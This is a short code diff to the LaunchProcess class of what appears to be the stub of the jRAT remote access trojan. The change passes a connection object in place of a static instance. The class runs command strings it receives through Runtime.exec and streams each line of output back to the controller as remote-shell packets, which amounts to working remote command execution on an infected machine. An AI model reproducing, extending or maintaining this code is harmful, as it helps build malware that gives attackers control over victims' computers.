@@ -8,11 +8,13 @@ import se.jrat.stub.packets.outgoing.Packet21RemoteShell;
 
 public class LaunchProcess extends Thread {
 
+	private Connection con;
 	public Process p;
 	public String process;
 	public static LaunchProcess latest;
 
-	public LaunchProcess(String process) {
+	public LaunchProcess(Connection con, String process) {
+		this.con = con;
 		this.process = process;
 		latest = this;
 	}
@@ -21,17 +23,17 @@ public class LaunchProcess extends Thread {
 		String line;
 		try {
 			p = Runtime.getRuntime().exec(process);
-			Connection.instance.status(Constants.STATUS_RAN_CMD);
+			con.status(Constants.STATUS_RAN_CMD);
 			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
 			while ((line = input.readLine()) != null) {
 				if (!line.trim().equals("")) {
-					Connection.instance.addToSendQueue(new Packet21RemoteShell(line));
+					con.addToSendQueue(new Packet21RemoteShell(line));
 				}
 			}
 			input.close();
 			latest = null;
 		} catch (Exception ex) {
-			Connection.instance.addToSendQueue(new Packet21RemoteShell("Failed to create process " + process + ": " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
+			con.addToSendQueue(new Packet21RemoteShell("Failed to create process " + process + ": " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
 			latest = null;
 		}
 	}
